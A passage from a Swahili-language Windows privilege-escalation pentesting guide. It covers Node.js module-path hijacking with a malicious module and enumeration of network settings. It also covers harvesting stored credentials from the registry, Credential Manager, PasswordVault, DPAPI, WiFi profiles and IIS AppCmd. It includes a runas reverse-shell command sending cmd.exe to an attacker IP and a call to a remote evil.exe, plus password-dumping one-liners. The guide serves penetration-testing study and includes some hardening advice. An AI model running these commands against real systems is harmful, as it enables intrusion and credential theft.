Ikiwa una **ruhusa za kuandika ndani ya folder iliyo kwenye PATH** unaweza kuweza kufanya hijack ya DLL inayopakiwa na process na **kuongeza privileges**.<sup>[[2]](#references)</sup>

Kagua ruhusa za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotekeleza import isiyo na njia kamili kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutatua package kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, mchakato huo unaweza kufika kwenye mzizi wa drive, kwa hiyo programu iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kukagua:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye mapendeleo ya chini** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye mapendeleo ya juu** utatue dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, kwa hiyo hali hii huwa **LPE** kila mara lengo linapoendeshwa kama administrator, kutoka kwenye scheduled task/service wrapper iliyo na mapendeleo yaliyoinuliwa, au kutoka kwenye programu ya desktop yenye mapendeleo inayojiendesha kiotomatiki.

Hili hutokea hasa wakati:

- dependency imetangazwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library imeweka `require("foo")` ndani ya `try/catch` na kuendelea iwapo itashindwa
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya dependency tree badala ya kuwa kwenye msimbo mkuu wa programu

### Kutafuta malengo yaliyo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au wrapper process)
- Chuja kwa `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na jaribio la mwisho la kufungua lililofaulu chini ya `C:\node_modules`

Miundo muhimu ya code-review katika faili za `.asar` zilizofunguliwa au source za programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la kifurushi kinachokosekana** kutoka Procmon au kwa kukagua chanzo.
2. Unda saraka kuu ya utafutaji ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya moduli za hiari zinazokosekana katika mifumo halisi na zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo inayoweza kutumika tena: tafuta **bare import inayokosekana** ambayo mchakato wa Windows Node/Electron wenye mapendeleo utajaribu kutatua.

### Mawazo ya ugunduzi na uimarishaji

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta michakato yenye integrity ya juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kupata mifumo ya kimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa library inaruhusu (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa legacy wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Mafolda yaliyoshirikiwa

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili ya hosts

Kagua faili ya hosts kuona kompyuta nyingine zinazojulikana zilizoainishwa moja kwa moja.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Porti Zilizofunguliwa

Angalia **huduma zilizozuiwa** kutoka nje.

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa mchakato, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya remote-control inaweza kutoa ufikiaji kama mtumiaji wa desktop wake ikiwa tu uthibitishaji na vidhibiti vya amri vinaruhusu. Application maalum ya TCP inayoendeshwa na akaunti yenye haki za juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni dalili za awali tu, ilhali njia ya memory-corruption inayohitaji uthibitishaji inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya mchakato wa mfumo, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha service ya backend; sheria ya forwarding pekee haithibitishi kwamba destination inaweza kufikiwa au ina udhaifu.

### Routing Table

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Amri[ zaidi za kuorodhesha mtandao zipo hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana kwenye `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, utaulizwa kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` ya Linux ndani ya WSL pekee hakukupi haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distro, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kuona amri ambazo huenda zilirekodi credentials; bado, kupandisha marupurupu kunahitaji akaunti halali yenye marupurupu ya juu na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distro kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo kwanza tambua distro na njia halisi ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uorodheshaji wa kiotomatiki.

## Credentials za Windows

### Credentials za Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni finding ya plaintext kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna password ya plaintext inayoweza kusomwa, hiyo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi password kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na kusoma registry kwa njia za kawaida hakuthibitishi kama secret hiyo ipo au inaweza kupatikana. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuliwa kwa credential.

### Kidhibiti cha credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa ajili ya seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail, na vivinjari vikaingia kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki. Hii inamaanisha kwamba **programu yoyote ya Windows inayohitaji credentials kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, kisha kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia vitambulisho vilivyohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` kwa kutumia seti ya vitambulisho vilivyotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kwamba unaweza kutumia mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au module ya Powershell ya [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila za plaintext ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonyeshwa pia kama `Web Credentials` kwenye `vaultcmd`). Eneo hili la hifadhi hutenganishwa kulingana na session na linaweza kufumbuliwa kwa kutumia uwezo asilia bila haki za usimamizi au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kutupa na kufumbua papo hapo majina yote ya watumiaji na nywila zote za plaintext zilizohifadhiwa:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche wa data kwa ufunguo linganifu, inayotumiwa zaidi ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji fiche wa funguo za faragha zisawia. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa kwenye entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kupitia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa domain ya mfumo.

Funguo za RSA za mtumiaji zilizosimbwa fiche kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji kwenye faili hiyo hiyo**, kwa kawaida huwa na data nasibu yenye urefu wa baiti 64. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo huwezi kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa unaweza kuyaorodhesha kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

**Faili za credentials zilizolindwa na nenosiri kuu** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to dekripsi.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vitambulisho vya PowerShell

**Vitambulisho vya PowerShell** hutumiwa mara nyingi kwa **scripting** na kazi za uwekaji otomatiki, kama njia rahisi ya kuhifadhi vitambulisho vilivyosimbwa kwa njia fiche. Vitambulisho hivi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba vinaweza tu kusimbuliwa na mtumiaji yuleyule kwenye kompyuta ileile vilipoundiwa.

Kitambulisho kilichohamishwa kinaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaelekeza kwenye faili kama hiyo, tafuta saraka halisi ya wasifu wa akaunti badala ya kudhani iko kwenye `C:\Users`: [Windows inaweza kuweka wasifu mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufunga kitambulisho kilichosimbwa kwa njia fiche kwa mtumiaji na kompyuta iliyokihamisha](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyorejeshwa lazima iwe na haki halali za kutumia huduma husika. Kagua njia na ACL kwanza, bila kuchapisha thamani zilizosimbwa kwa njia fiche au zilizo katika maandishi ya kawaida wakati wa ukaguzi wa kawaida.

Ili **kusimbua** vitambulisho vya PS kutoka kwenye faili inayovihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Sifa za Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya miunganisho.** Kagua XML inayosomeka kwenye `%APPDATA%\mRemoteNG` na folda ya Documents ya mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya miunganisho na sifa za `Password` zilizosimbwa kwa njia fiche kabla ya kuchukulia faili ya XML kama kidokezo cha credentials. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji fiche ya faili na kama master password maalum ilitumika. Epuka kuchapisha thamani zilizosimbwa kwa njia fiche wakati wa utafutaji mpana.

**Exports za profile za Remote Desktop Plus** zinaweza pia kusomeka kwenye folda za watumiaji au folda ya pamoja ya usimamizi. Export ya zamani ya `profiles.xml` ina vipengee vya `Data/Profile` vyenye vipengee vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengee cha password kisicho tupu kama kidokezo cha credentials, bila kukichapisha au kudhani kuwa kiko wazi: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kufungamanishwa na akaunti na kompyuta iliyoiunda, au kusanidiwa bila masharti makali. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitegemea.

### Sticky Notes

Watu wakati mwingine huhifadhi passwords na taarifa nyingine kwenye programu za sticky-note. Programu ya Sticky Notes ya Microsoft inayosakinishwa kama kifurushi kwa kawaida huhifadhi madokezo kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za wasifu wa mtumiaji, zikiwemo LevelDB. Tambua programu iliyosakinishwa na fomati ya hifadhi kabla ya kuchukulia kutokuwepo kwa faili ya SQLite kuwa hakuna madokezo.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa madokezo ya hivi karibuni yaliyokamilishwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; faharasa ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [nyaraka za WAL za SQLite](https://www.sqlite.org/wal.html). Dokezo lenye jina la akaunti au password ni kidokezo cha credentials tu: thibitisha akaunti, ruhusa ya kuifikia, na matumizi tena ya password kivyake. Rekodi iliyosimbwa kwa njia fiche ya password manager pia inahitaji ufunguo wake halisi wa usimbuaji na tafsiri mahususi ya programu kabla ya kuthibitisha login yenye ruhusa za juu zaidi.

### AppCmd.exe

**Kumbuka kwamba ili kurejesha passwords kutoka kwa AppCmd.exe unahitaji kuwa Administrator na kuiendesha katika kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye folda ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, huenda baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Msimbo huu umetolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa SYSTEM privileges**, nyingi zinaweza kushambuliwa kupitia **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Support-tool registry credential artifacts

Baadhi ya usakinishaji wa zamani wa remote-support huhifadhi majina ya value zinazohusiana na password chini ya funguo maalum za registry za programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilionyesha password tuli ya session iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [maelezo ya vendor kuhusu registry key](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Alama ya jina la value ni kidokezo tu cha ukaguzi: thibitisha toleo lililosakinishwa, data ya value inayosomeka, umbizo na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kuhama kutoka password ya remote-support hadi akaunti ya Windows yenye ruhusa zaidi kunahitaji pia password hiyo itumike tena kwa akaunti hiyo na uwe na idhini ya kuitumia. Usijumuishe ciphertext na password zilizorejeshwa katika matokeo ya kawaida ya enumeration.

### Spreadsheets zilizoshirikiwa zenye sheets zilizolindwa

Ikiwa unashuku kuwa workbook inayoweza kusomeka iliyoshirikiwa ina data za akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft inasema](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kuwa ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya workbook yamesimbwa kwa fiche. Kagua faili zilizoidhinishwa na zinazohusika tu, na epuka kuchapisha siri zinazoweza kuwepo wakati wa enumeration pana. Path ya `.xlsx` inayosomeka, sheet iliyolindwa, au safu wima iliyofichwa peke yake haithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina ruhusa zaidi; thibitisha data halisi na haki za sasa za akaunti kando.

### Patches za mabadiliko zilizohifadhiwa na CI server

CI server inaweza kuhifadhi mabadiliko ya source code yaliyowasilishwa kwenye data directory yake hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kama hifadhi ya mabadiliko ya remote-run; data directory inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeleo yaliyoongezwa au kuondolewa ya faili ya credential, ufunguo wa encryption, au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell `ConvertTo-SecureString -Key` inahitaji ufunguo wa AES pamoja na string iliyosimbwa kwa fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kando. Kagua majina ya patch zinazofikika kwanza, kisha kagua maudhui husika kwa idhini bila kuchapisha siri katika matokeo ya kawaida ya enumeration. Path ya patch, value iliyosimbwa kwa fiche, au marejeleo ya ufunguo peke yake hayathibitishi credential halali au ufikiaji wa ruhusa za juu zaidi. Zuia ACL za data directory na epuka kuweka siri kwenye mabadiliko ya build.

### Uzungushaji maalum wa password ya local administrator

Programu maalum ya kubadilisha password inaweza kuhifadhi password iliyosimbwa kwa fiche ya local administrator ndani ya local service huku credentials za datastore yake zikiwa kwenye faili ya `.env` inayosomeka au karibu na binary ya updater. Kagua scheduled task ya updater, akaunti, ACL za usanidi, listener na ruhusa za datastore kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani mwenye credentials halali, lakini uthibitishaji peke yake hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya encryption au key material inapatikana karibu na ciphertext, kagua key derivation halisi kabla ya kuamini encryption hiyo. Mbinu inayotengeneza key ya AES kwa namna ya deterministic kutoka seed iliyo wazi kwa kutumia Go [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda password hiyo; Go inasema package hiyo haifai kwa randomness inayohusika na usalama. Thibitisha kuwa password yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo kwenye kundi la local Administrators kabla ya kuichukulia kama njia ya escalation. Scheduled task, path ya `.env`, au encrypted blob peke yake havithibitishi masharti hayo. Usijumuishe password na key material katika matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti password za local administrator. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) pia huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma index maalum.

### JAR archives za Java server plugin na matumizi tena ya credentials

Baadhi ya Java server plugins husambazwa kama JAR archives kwenye directory ya `plugins` ya server. Custom plugin inayosomeka inaweza kuwa na usanidi au bytecode yenye service credential iliyopachikwa. Kagua archive kwa idhini tu na usijumuishe siri zilizorejeshwa katika matokeo ya kawaida ya enumeration. Path ya plugin peke yake haithibitishi kuwa kuna siri, na service password iliyorejeshwa huwezesha ruhusa za juu zaidi tu ikiwa pia ni halali kwa akaunti yenye ruhusa zaidi. Kagua ACL za faili husika na badilisha credentials zilizotumiwa tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kuhusu mpangilio wa directory na [nyaraka za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kuhusu maudhui ya archive.

### Credentials za Openfire embedded database

